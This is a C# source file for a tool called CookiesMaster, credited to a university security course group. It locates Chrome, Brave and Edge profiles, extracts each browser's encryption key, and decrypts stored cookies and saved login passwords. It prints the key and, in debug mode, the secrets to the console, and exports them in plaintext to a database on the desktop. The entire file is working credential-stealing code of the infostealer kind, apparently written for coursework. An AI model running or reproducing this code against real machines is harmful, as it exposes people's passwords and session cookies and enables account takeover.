using System.Data.SQLite;
using CookiesMaster.Models;
using CookiesMaster.Utils;
using static System.Console;
using static System.Text.Encoding;
using static CookiesMaster.Utils.ConsoleCustom;
using Convert = System.Convert;

namespace CookiesMaster;

public static class BrowserDecrypt
{
    public enum Browser
    {
        Chrome,
        Brave,
        Edge
    }

    public static Browser FromName(string name)
    {
        //ignore case
        if (name.Contains("chrome", StringComparison.OrdinalIgnoreCase))
        {
            return Browser.Chrome;
        }

        if (name.Contains("brave", StringComparison.OrdinalIgnoreCase))
        {
            return Browser.Brave;
        }

        if (name.Contains("edge", StringComparison.OrdinalIgnoreCase))
        {
            return Browser.Edge;
        }

        throw new Exception("Browser not found");
    }

    public static readonly Dictionary<Browser, List<CookieData>> Cookies = new();
    public static readonly Dictionary<Browser, List<LoginData>> Logins = new();

    public static void Run()
    {
        BackgroundColor = ConsoleColor.Black;
        ForegroundColor = ConsoleColor.DarkGreen;

        WriteLine("╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗");
        WriteLine("║    ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗███████╗    ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗       ║");
        WriteLine("║   ██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║██╔════╝    ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗      ║");
        WriteLine("║   ██║     ██║   ██║██║   ██║█████╔╝ ██║█████╗      ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝      ║");
        WriteLine("║   ██║     ██║   ██║██║   ██║██╔═██╗ ██║██╔══╝      ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗      ║");
        WriteLine("║   ╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║███████╗    ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║      ║");
        WriteLine("║    ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝      ║");
        WriteLine("║                                                                                                              ║");
        WriteLine("║  DECIFRADOR DE COOKIES DE NAVEGADORES BASADOS EN CHROMIUM, COMO CHROME, EDGE, BRAVE, OPERA, VIVALDI, ETC.    ║");
        WriteLine("║  ********************************************************************************************************    ║");
        WriteLine("║  AUTOR: GRUPO 3 - SEGURIDAD INFORMATICA - UNIVERSIDAD DE LAS FUERZAS ARMADAS ESPE - 2021                     ║");
        WriteLine("║                                                                                                              ║");
        WriteLine("║  INTEGRANTES:                                                                                                ║");
        WriteLine("║  - Luis Miguel Vasquez Basurto                                                                               ║");
        WriteLine("║  - Oscar Vladimir Avellan Mora                                                                               ║");
        WriteLine("║  - Melany Mayerli Vera Delgado                                                                               ║");
        WriteLine("║  - Steven Sinchiguano                                                                                        ║");
        WriteLine("╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝");
        WriteLine();


        var user = Environment.GetEnvironmentVariable("USERPROFILE");
        if (user == null)
        {
            WriteError("[!] No se pudo obtener el directorio del usuario");
            return;
        }

        WriteLine("[+] Current user: {0}", user);

        var path = @$"{user}\AppData\Local";

        const string chromeProfile = "Profile 1";

        Decrypt($@"{path}\Google\Chrome\User Data\Local State", $@"{path}\Google\Chrome\User Data\{chromeProfile}\Network\Cookies", $@"{path}\Google\Chrome\User Data\{chromeProfile}\Login Data");
        Decrypt($@"{path}\BraveSoftware\Brave-Browser\User Data\Local State", $@"{path}\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies", $@"{path}\BraveSoftware\Brave-Browser\User Data\Default\Login Data");
        Decrypt($@"{path}\Microsoft\Edge\User Data\Local State", $@"{path}\Microsoft\Edge\User Data\Default\Network\Cookies", $@"{path}\Microsoft\Edge\User Data\Default\Login Data");

        WriteLine("Presione cualquier tecla para salir...");

        return;


        void Decrypt(string localStatePath, string cookiesDbPath, string loginDataPath)
        {
            if (!File.Exists(localStatePath))
            {
                WriteError("[!] Local State file not found: {0}", localStatePath);
                return;
            }

            if (!File.Exists(cookiesDbPath))
            {
                WriteError("[!] Cookies database not found: {0}", cookiesDbPath);
                return;
            }

            if (!File.Exists(loginDataPath))
            {
                WriteError("[!] Login Data database not found: {0}", loginDataPath);
                return;
            }


            try
            {
                var browser = RegexComponent.GetBrowserName(localStatePath);
                var crypto = new AesCrypto(localStatePath);

                var desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                var exportPath = Path.Combine(desktop, $"decrypted_{browser}.db");

                SQLiteConnection exportConnection;

                if (Config.Export)
                {
                    exportConnection = new SQLiteConnection("Data Source=" + exportPath);
                    exportConnection.Open();

                    WriteBoxed($"[+] Decrypting {browser}", ConsoleColor.DarkCyan);

                    new SQLiteCommand(CookieData.Ddl, exportConnection).ExecuteNonQuery();
                    if (Config.Debug) WriteLine("[+] Executing: {0}", CookieData.Ddl);

                    new SQLiteCommand(LoginData.Ddl, exportConnection).ExecuteNonQuery();
                    if (Config.Debug) WriteLine("[+] Executing: {0}", LoginData.Ddl);
                }
                else
                {
                    exportConnection = null!;
                }

                WriteLine("[+] Statekey for {0} = {1}", browser, Convert.ToBase64String(crypto.Key));

                var cookies = DecryptCookie(exportConnection, cookiesDbPath, browser, crypto);
                var logins = DecryptLoginData(exportConnection, loginDataPath, browser, crypto);

                WriteLine("[+] Cookies decrypted: {0}", cookies.Count);
                WriteLine("[+] Logins decrypted: {0}", logins.Count);

                WriteLine("Base de datos exportada correctamente a: " + exportPath);

                if (Config.Export)
                {
                    exportConnection.Close();
                    exportConnection.Dispose();
                }

                Cookies.Add(FromName(browser), cookies);
                Logins.Add(FromName(browser), logins);
            }
            catch (Exception e)
            {
                WriteError(e.Message, " : " + e.GetType());
            }

            WriteLine();
        }
    }

    private static List<CookieData> DecryptCookie(SQLiteConnection exportConnection, string cookiesDbPath, string browser, AesCrypto crypto)
    {
        WriteLine($"[+] Decrypting cookies for {browser}");

        using var connection = new SQLiteConnection($"Data Source={cookiesDbPath}");
        connection.Open();

        var reader = new SQLiteCommand(CookieData.Query, connection).ExecuteReader();

        if (Config.Debug) WriteLine("[+] Executing: {0}", CookieData.Query);

        var cookies = new List<CookieData>();

        while (reader.Read())
        {
            try
            {
                var cookie = new CookieData(reader);
                if (Config.Debug) WriteLine(cookie);

                var encryptedValue = (byte[])reader["encrypted_value"];

                if (V10Check(encryptedValue))
                {
                    cookie.Value = UTF8.GetString(crypto.Decrypt(encryptedValue));
                    if (Config.Debug) WriteSuccess("[+] Decrypted cookie: {0}", cookie.Value);
                }
                else
                {
                    if (Config.Debug) WriteWarning("[!] Couldn't decrypt cookie for {0}", cookie.HostKey);
                }

                if (Config.Export)
                {
                    var command = new SQLiteCommand(CookieData.Insert, exportConnection);

                    #region SET PARAMETERS

                    command.Parameters.AddWithValue("@creation_utc", cookie.CreationUtc);
                    command.Parameters.AddWithValue("@host_key", cookie.HostKey);
                    command.Parameters.AddWithValue("@name", cookie.Name);
                    command.Parameters.AddWithValue("@encrypted_value", encryptedValue);
                    command.Parameters.AddWithValue("@path", cookie.Path);
                    command.Parameters.AddWithValue("@source_port", cookie.SourcePort);
                    command.Parameters.AddWithValue("@source_scheme", cookie.SourceScheme);
                    command.Parameters.AddWithValue("@value", cookie.Value);

                    #endregion

                    command.ExecuteNonQuery();
                }

                cookies.Add(cookie);
            }
            catch (Exception e)
            {
                WriteError(e.Message, " : " + e.GetType());
            }
        }

        return cookies;
    }

    private static List<LoginData> DecryptLoginData(SQLiteConnection exportConnection, string loginDataPath, string browser, AesCrypto crypto)
    {
        WriteLine($"[+] Decrypting logins for {browser}");

        using var connection = new SQLiteConnection($"Data Source={loginDataPath}");
        connection.Open();

        var reader = new SQLiteCommand(LoginData.Query, connection).ExecuteReader();

        if (Config.Debug) WriteLine("[+] Executing: {0}", LoginData.Query);

        var logins = new List<LoginData>();
        while (reader.Read())
        {
            try
            {
                var login = new LoginData(reader);
                if (Config.Debug) WriteLine(login);

                var encryptedValue = (byte[])reader["password_value"];

                if (V10Check(encryptedValue))
                {
                    login.Password = UTF8.GetString(crypto.Decrypt(encryptedValue));
                    if (Config.Debug) WriteSuccess("[+] Decrypted password: {0}", login.Password);
                }
                else
                {
                    if (Config.Debug) WriteWarning("[!] Couldn't decrypt password for {0}", login.OriginUrl);
                }

                if (Config.Export)
                {
                    var command = new SQLiteCommand(LoginData.Insert, exportConnection);

                    #region SET PARAMETERS

                    command.Parameters.AddWithValue("@origin_url", login.OriginUrl);
                    command.Parameters.AddWithValue("@action_url", login.ActionUrl);
                    command.Parameters.AddWithValue("@username_element", login.UsernameElement);
                    command.Parameters.AddWithValue("@username_value", login.UsernameValue);
                    command.Parameters.AddWithValue("@password_element", login.PasswordElement);
                    command.Parameters.AddWithValue("@password_value", encryptedValue);
                    command.Parameters.AddWithValue("@submit_element", login.SubmitElement);
                    command.Parameters.AddWithValue("@date_created", login.DateCreated);
                    command.Parameters.AddWithValue("@scheme", login.Scheme);
                    command.Parameters.AddWithValue("@password_type", login.PasswordType);
                    command.Parameters.AddWithValue("@signon_realm", login.SignonRealm);
                    command.Parameters.AddWithValue("@id", login.Id);
                    command.Parameters.AddWithValue("@password", login.Password);

                    #endregion

                    command.ExecuteNonQuery();
                }

                logins.Add(login);
            }
            catch (Exception e)
            {
                WriteError(e.Message, " : " + e.GetType());
            }
        }

        return logins;
    }

    private static bool V10Check(IReadOnlyList<byte> encryptedValue) => encryptedValue[0] == 'v' && encryptedValue[1] == '1' && encryptedValue[2] == '0';
}